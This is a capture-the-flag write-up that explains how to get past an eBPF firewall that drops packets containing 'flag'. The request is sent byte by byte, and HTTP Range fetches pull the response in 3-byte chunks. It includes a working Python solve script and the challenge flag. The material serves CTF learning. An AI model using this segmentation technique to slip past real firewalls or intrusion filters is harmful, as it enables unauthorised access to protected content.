# Web - Firewall

**Goal:** Retrieve the content of `/flag.html` protected by an eBPF firewall.

## Challenge Analysis

We are provided with a Docker environment running Nginx on port 5000. The interesting part is an eBPF program (`firewall.c`) attached to the `eth0` interface using Traffic Control (TC) hooks.

### The Firewall (`firewall.c`)

The eBPF program filters both **Ingress** and **Egress** traffic (`tc/ingress` section used for both in `entrypoint.sh`).

The core filtering logic is:
1. **Keyword Scan**: It scans the TCP payload for the 4-byte string `"flag"`.
2. **Character Scan**: It blocks the character `%` (preventing URL encoding bypasses like `%66lag`).
3. **Action**: If a match is found, `TC_ACT_SHOT` is returned, dropping the packet.

```c
// firewall.c
#define KW_LEN 4
static const char blocked_kw[KW_LEN] = "flag";
...
if (__builtin_memcmp(buf, blocked_kw, KW_LEN) == 0) {
    ctx->found = 1;
    return 1;
}
```

### The Vulnerability

The eBPF filter scans packets individually. It does not reassemble the TCP stream. This means if the forbidden keyword `"flag"` is split across two separate TCP packets, the firewall will not see it (e.g., packet 1 has "fl", packet 2 has "ag").

We need to bypass the filter in two directions:
1. **Ingress (Client -> Server)**: The request `GET /flag.html` contains the word "flag".
2. **Egress (Server -> Client)**: The response body (the HTML file) contains "flag".

## Exploitation Strategy

### 1. Ingress Bypass: TCP Segmentation

To send the request `GET /flag.html` without triggering the firewall, we can split the TCP stream at the application layer. By sending the request byte-by-byte with a tiny delay (and setting `TCP_NODELAY`), we force the TCP stack to send separate packets.

### 2. Egress Bypass: HTTP Range Headers

The server response will also be filtered. We can use the **HTTP `Range` header** to request the file in chunks smaller than the blocked keyword length (4 bytes). If we request 3 bytes at a time, no single response packet can possibly contain the 4-byte sequence `"flag"`.

## Solution Script

We implemented a Python script that:
1. Connects to the target.
2. Sends the HTTP request byte-by-byte to bypass Ingress filtering.
3. Uses `Range: bytes=X-Y` headers to fetch the file in 3-byte chunks to bypass Egress filtering.
4. Reconstructs the file content.

```python
#!/usr/bin/env python3
import socket
import time
import sys
import re

TARGET_HOST = "35.227.38.232"
TARGET_PORT = 5000
CHUNK_SIZE = 3

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.settimeout(5)
    s.connect((TARGET_HOST, TARGET_PORT))
    return s

def send_segmented_request(sock, request_str):
    cmd = request_str.encode()
    for b in cmd:
        sock.send(bytes([b]))
        time.sleep(0.005)

def get_flag_chunked():
    full_content = b""
    current_idx = 0
    total_size = 213
    
    while current_idx < total_size:
        end_idx = min(current_idx + CHUNK_SIZE - 1, total_size - 1)
        s = create_socket()
        
        req = f"GET /flag.html HTTP/1.1\r\nHost: {TARGET_HOST}:{TARGET_PORT}\r\nRange: bytes={current_idx}-{end_idx}\r\nConnection: close\r\n\r\n"
        send_segmented_request(s, req)
        
        response = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk: break
                response += chunk
            except socket.timeout:
                break
        
        s.close()
        parts = response.split(b"\r\n\r\n", 1)
        if len(parts) == 2:
            full_content += parts[1]
                
        current_idx += CHUNK_SIZE
        time.sleep(0.1)

    print(full_content.decode())

if __name__ == "__main__":
    get_flag_chunked()
```

## The Flag

After reconstructing the chunks, the final HTML contained:

`uoftctf{f1rew4l1_Is_nOT_par7icu11rLy_R0bust_I_bl4m3_3bpf}`

Solved by: jerit3787


Solved by: jerit3787